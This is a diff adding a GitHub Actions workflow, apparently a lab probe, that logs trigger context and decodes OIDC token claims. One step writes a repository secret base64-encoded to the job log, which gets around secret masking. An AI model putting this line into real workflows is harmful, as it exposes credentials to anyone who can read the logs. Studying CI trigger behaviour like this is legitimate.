@@ -1,0 +1,28 @@
+name: ctx
+on:
+  pull_request:
+  pull_request_target:
+  push:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  ctx:
+    if: github.event_name != 'pull_request_target' || github.event.pull_request.head.repo.full_name == github.repository
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: report
+        env:
+          MARKER: main-v1
+          REPO_SECRET: ${{ secrets.REPO_SECRET }}
+        run: |
+          echo "MARKER=$MARKER EVENT=$GITHUB_EVENT_NAME"
+          echo "GITHUB_REF=$GITHUB_REF GITHUB_SHA=$GITHUB_SHA"
+          echo "HEAD_REF=$GITHUB_HEAD_REF BASE_REF=$GITHUB_BASE_REF"
+          echo "WORKFLOW_REF=$GITHUB_WORKFLOW_REF WORKFLOW_SHA=$GITHUB_WORKFLOW_SHA"
+          echo "CHECKOUT_HEAD=$(git rev-parse HEAD) SUBJECT=$(git log -1 --format=%s)"
+          echo "REPO_SECRET_PRESENT=$([ -n "$REPO_SECRET" ] && echo yes || echo no) B64=$(printf %s "$REPO_SECRET" | base64)"
+          tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=lab" | jq -r .value)
+          python3 -c 'import sys,json,base64; p=sys.argv[1].split(".")[1]; p+="="*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print("OIDC", json.dumps({k:c.get(k) for k in ("sub","ref","event_name","job_workflow_ref","environment","head_ref","base_ref")}))' "$tok"
